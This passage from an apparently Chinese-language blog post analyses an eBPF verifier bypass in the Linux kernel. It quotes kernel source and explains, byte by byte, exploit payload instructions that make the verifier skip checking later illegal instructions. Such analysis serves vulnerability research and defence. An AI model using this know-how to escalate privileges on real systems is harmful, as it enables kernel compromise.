class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">static int check_cond_jmp_op(struct verifier_env *env,</span><br><span class="line">                 struct bpf_insn *insn, int *insn_idx)</span><br><span class="line">&#123;</span><br><span class="line">    struct reg_state *regs &#x3D; env-&gt;cur_state.regs;</span><br><span class="line">    struct verifier_state *other_branch;</span><br><span class="line">    u8 opcode &#x3D; BPF_OP(insn-&gt;code);</span><br><span class="line">    int err;</span><br><span class="line"></span><br><span class="line">    if (opcode &gt; BPF_EXIT) &#123;</span><br><span class="line">        verbose(&quot;invalid BPF_JMP opcode %x\n&quot;, opcode);</span><br><span class="line">        return -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_X) &#123;</span><br><span class="line">        if (insn-&gt;imm !&#x3D; 0) &#123;</span><br><span class="line">            verbose(&quot;BPF_JMP uses reserved fields\n&quot;);</span><br><span class="line">            return -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;* check src1 operand *&#x2F;</span><br><span class="line">        err &#x3D; check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">        if (err)</span><br><span class="line">            return err;</span><br><span class="line"></span><br><span class="line">        if (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(&quot;R%d pointer comparison prohibited\n&quot;,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            return -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (insn-&gt;src_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">            verbose(&quot;BPF_JMP uses reserved fields\n&quot;);</span><br><span class="line">            return -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* check src2 operand *&#x2F;</span><br><span class="line">    err &#x3D; check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">    if (err)</span><br><span class="line">        return err;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 主要关注这里</span><br><span class="line">    &#x2F;* detect if R &#x3D;&#x3D; 0 where R was initialized to zero earlier *&#x2F;</span><br><span class="line">    if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">        (opcode &#x3D;&#x3D; BPF_JEQ || opcode &#x3D;&#x3D; BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type &#x3D;&#x3D; CONST_IMM &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].imm &#x3D;&#x3D; insn-&gt;imm) &#123;</span><br><span class="line">        if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">            &#x2F;* if (imm &#x3D;&#x3D; imm) goto pc+off;</span><br><span class="line">             * only follow the goto, ignore fall-through</span><br><span class="line">             *&#x2F;</span><br><span class="line">            *insn_idx +&#x3D; insn-&gt;off;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;* if (imm !&#x3D; imm) goto pc+off;</span><br><span class="line">             * only follow fall-through branch, since</span><br><span class="line">             * that&#39;s where the program will go</span><br><span class="line">             *&#x2F;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    other_branch &#x3D; push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx);</span><br><span class="line">    if (!other_branch)</span><br><span class="line">        return -EFAULT;</span><br><span class="line"></span><br><span class="line">    &#x2F;* detect if R &#x3D;&#x3D; 0 where R is returned value from bpf_map_lookup_elem() *&#x2F;</span><br><span class="line">    if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">        insn-&gt;imm &#x3D;&#x3D; 0 &amp;&amp; (opcode &#x3D;&#x3D; BPF_JEQ ||</span><br><span class="line">                   opcode &#x3D;&#x3D; BPF_JNE) &amp;&amp;</span><br><span class="line">        regs[insn-&gt;dst_reg].type &#x3D;&#x3D; PTR_TO_MAP_VALUE_OR_NULL) &#123;</span><br><span class="line">        if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">            &#x2F;* next fallthrough insn can access memory via</span><br><span class="line">             * this register</span><br><span class="line">             *&#x2F;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D; PTR_TO_MAP_VALUE;</span><br><span class="line">            &#x2F;* branch targer cannot access it, since reg &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm &#x3D; 0;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type &#x3D; PTR_TO_MAP_VALUE;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">        verbose(&quot;R%d pointer comparison prohibited\n&quot;, insn-&gt;dst_reg);</span><br><span class="line">        return -EACCES;</span><br><span class="line">    &#125; else if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">           (opcode &#x3D;&#x3D; BPF_JEQ || opcode &#x3D;&#x3D; BPF_JNE)) &#123;</span><br><span class="line"></span><br><span class="line">        if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">            &#x2F;* detect if (R &#x3D;&#x3D; imm) goto</span><br><span class="line">             * and in the target state recognize that R &#x3D; imm</span><br><span class="line">             *&#x2F;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;* detect if (R !&#x3D; imm) goto</span><br><span class="line">             * and in the fall-through state recognize that R &#x3D; imm</span><br><span class="line">             *&#x2F;</span><br><span class="line">            regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (log_level)</span><br><span class="line">        print_verifier_state(env);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>check_cond_jmp_op</code>函数中，主要关注如下的代码片段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">    (opcode &#x3D;&#x3D; BPF_JEQ || opcode &#x3D;&#x3D; BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type &#x3D;&#x3D; CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm &#x3D;&#x3D; insn-&gt;imm) &#123;</span><br><span class="line">    if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">        &#x2F;* if (imm &#x3D;&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow the goto, ignore fall-through</span><br><span class="line">         *&#x2F;</span><br><span class="line">        *insn_idx +&#x3D; insn-&gt;off;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;* if (imm !&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow fall-through branch, since</span><br><span class="line">         * that&#39;s where the program will go</span><br><span class="line">         *&#x2F;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch &#x3D; push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx);</span><br><span class="line">if (!other_branch)</span><br><span class="line">    return -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure>
<p>在这个代码片段中，检查了当前的跳转是否是确定的，也即“恒跳转”，如果是确定的，那么要么<code>insn_idx</code>前移(JEQ)，要么不动(JNE)，而如果不是确定的跳转，那么就说明之后的分支是有可能会被执行的，那么调用<code>push_stack</code>函数将下一个可能的分支压栈，等待进一步的校验</p>
<p>我们来分别看看第二句payload是否符合这个条件</p>
<ol>
<li><code>BPF_SRC(insn-&gt;code) == BPF_K</code>这一句：<code>0x55 &amp; 0x08 = 0x00 == BPF_K</code>, 符合条件</li>
<li><code>(opcode == BPF_JEQ || opcode == BPF_JNE)</code>这一句，<code>opcode = 0x50 == BPF_JNE</code>，符合条件</li>
<li><code>regs[insn-&gt;dst_reg].type == CONST_IMM</code>这一句，如果还记得，第一句payload中，<code>regs[insn-&gt;dst_reg].type</code>就被赋值为了<code>CONST_IMM</code>，符合条件</li>
<li><code>regs[insn-&gt;dst_reg].imm == insn-&gt;imm</code>这一句，由于等号两边数据类型都是有符号32位整型(很关键)，并且<code>0xffffffff == 0xffffffff</code>，所以符合条件</li>
</ol>
<p>既然四个都为<code>true</code>，并且<code>opcode = 0x50 == BPF_JNE</code>，那么直接返回，不执行之后的压入下一个可能分支的操作</p>
<p>到这儿同样也是没有什么问题，<code>check_cond_jmp_op</code>返回，<code>do_check</code>函数继续循环检查下一行指令，由于没有跳转，所以依然是顺序执行</p>
<p>那我们继续来看第三句指令 <code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>，这一句没有什么特别的，和第一句payload很像，仅是为了保证下方第四句payload能够正常执行,原因如下代码所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (opcode &#x3D;&#x3D; BPF_EXIT) &#123;</span><br><span class="line">if (BPF_SRC(insn-&gt;code) !&#x3D; BPF_K ||</span><br><span class="line">    insn-&gt;imm !&#x3D; 0 ||</span><br><span class="line">    insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">    insn-&gt;dst_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">    verbose(&quot;BPF_EXIT uses reserved fields\n&quot;);</span><br><span class="line">    return -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于第四句payload的opcode为<code>BPF_EXIT</code>，所以要想保证第四句指令的执行不出错，那么就要保证<code>BPF_REG_0</code>中的值为0</p>
<p>故而第三句指令<code>\xb7\x00\x00\x00\x00\x00\x00\x00</code>即是将<code>BPF_REG_0</code>赋值为0</p>
<p>第三句指令执行完成后，我们继续看第四句指令<code>\x95\x00\x00\x00\x00\x00\x00\x00</code>，这一句就类似<code>exit(0)</code></p>
<p>这句指令在计算了class以及opcode后，会进入以下分支：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">else if (opcode &#x3D;&#x3D; BPF_EXIT) &#123;</span><br><span class="line">                if (BPF_SRC(insn-&gt;code) !&#x3D; BPF_K ||</span><br><span class="line">                    insn-&gt;imm !&#x3D; 0 ||</span><br><span class="line">                    insn-&gt;src_reg !&#x3D; BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg !&#x3D; BPF_REG_0) &#123;</span><br><span class="line">                    verbose(&quot;BPF_EXIT uses reserved fields\n&quot;);</span><br><span class="line">                    return -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;* eBPF calling convetion is such that R0 is used</span><br><span class="line">                 * to return the value from eBPF program.</span><br><span class="line">                 * Make sure that it&#39;s readable at this time</span><br><span class="line">                 * of bpf_exit, which means that program wrote</span><br><span class="line">                 * something into it earlier</span><br><span class="line">                 *&#x2F;</span><br><span class="line">                err &#x3D; check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                if (err)</span><br><span class="line">                    return err;</span><br><span class="line"></span><br><span class="line">                if (is_pointer_value(env, BPF_REG_0)) &#123; &#x2F;&#x2F; 保证不泄露内核地址</span><br><span class="line">                    verbose(&quot;R0 leaks addr as return value\n&quot;);</span><br><span class="line">                    return -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx &#x3D; pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                if (insn_idx &lt; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    do_print_state &#x3D; true;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br></pre></td></tr></table></figure>
<p>这里在经过安全检查后，尝试调用<code>pop_stack</code>函数，检查是否还有可能执行的分支等待检查，如果没有，那么直接跳出循环，结束检查，加载bpf指令</p>
<p>在我们的payload中，没有等待检查的分支，符合这一情况。那么换句话说，<code>do_check</code>函数只检查了前四句payload就认为之后的语句不会再被执行了，于是就放弃了对后续大段非法payload的校验</p>
<p>实际上，如果真实执行的流程与虚拟执行的流程完全一样，那么实际上是不存在漏洞的，我们的payload至始至终也只会执行前四句指令而已，但是，问题就出在了这两种流程的差别之处</p>
<p>那么我们看看真实执行的情况，以下代码均位于<code>kernel/bpf/core.c</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *    __bpf_prog_run - run eBPF program on a given context</span><br><span class="line"> *    @ctx: is the data we are operating on</span><br><span class="line"> *    @insn: is the array of eBPF instructions</span><br><span class="line"> *</span><br><span class="line"> * Decode and execute eBPF instructions.</span><br><span class="line"> *&#x2F;</span><br><span class="line">static unsigned int __bpf_prog_run(void *ctx, const struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">    u64 stack[MAX_BPF_STACK &#x2F; sizeof(u64)];</span><br><span class="line">    u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">    static const void *jumptable[256] &#x3D; &#123;</span><br><span class="line">        [0 ... 255] &#x3D; &amp;&amp;default_label,</span><br><span class="line">        &#x2F;* Now overwrite non-defaults ... *&#x2F;</span><br><span class="line">        &#x2F;* 32 bit ALU operations *&#x2F;</span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_X] &#x3D; &amp;&amp;ALU_ADD_X,</span><br><span class="line">        [BPF_ALU | BPF_ADD | BPF_K] &#x3D; &amp;&amp;ALU_ADD_K,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_X] &#x3D; &amp;&amp;ALU_SUB_X,</span><br><span class="line">        [BPF_ALU | BPF_SUB | BPF_K] &#x3D; &amp;&amp;ALU_SUB_K,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_X] &#x3D; &amp;&amp;ALU_AND_X,</span><br><span class="line">        [BPF_ALU | BPF_AND | BPF_K] &#x3D; &amp;&amp;ALU_AND_K,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_X]  &#x3D; &amp;&amp;ALU_OR_X,</span><br><span class="line">        [BPF_ALU | BPF_OR | BPF_K]  &#x3D; &amp;&amp;ALU_OR_K,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_X] &#x3D; &amp;&amp;ALU_LSH_X,</span><br><span class="line">        [BPF_ALU | BPF_LSH | BPF_K] &#x3D; &amp;&amp;ALU_LSH_K,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_X] &#x3D; &amp;&amp;ALU_RSH_X,</span><br><span class="line">        [BPF_ALU | BPF_RSH | BPF_K] &#x3D; &amp;&amp;ALU_RSH_K,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_X] &#x3D; &amp;&amp;ALU_XOR_X,</span><br><span class="line">        [BPF_ALU | BPF_XOR | BPF_K] &#x3D; &amp;&amp;ALU_XOR_K,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_X] &#x3D; &amp;&amp;ALU_MUL_X,</span><br><span class="line">        [BPF_ALU | BPF_MUL | BPF_K] &#x3D; &amp;&amp;ALU_MUL_K,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_X] &#x3D; &amp;&amp;ALU_MOV_X,</span><br><span class="line">        [BPF_ALU | BPF_MOV | BPF_K] &#x3D; &amp;&amp;ALU_MOV_K,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_X] &#x3D; &amp;&amp;ALU_DIV_X,</span><br><span class="line">        [BPF_ALU | BPF_DIV | BPF_K] &#x3D; &amp;&amp;ALU_DIV_K,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_X] &#x3D; &amp;&amp;ALU_MOD_X,</span><br><span class="line">        [BPF_ALU | BPF_MOD | BPF_K] &#x3D; &amp;&amp;ALU_MOD_K,</span><br><span class="line">        [BPF_ALU | BPF_NEG] &#x3D; &amp;&amp;ALU_NEG,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_BE] &#x3D; &amp;&amp;ALU_END_TO_BE,</span><br><span class="line">        [BPF_ALU | BPF_END | BPF_TO_LE] &#x3D; &amp;&amp;ALU_END_TO_LE,</span><br><span class="line">        &#x2F;* 64 bit ALU operations *&#x2F;</span><br><span class="line">        [BPF_ALU64 | BPF_ADD | 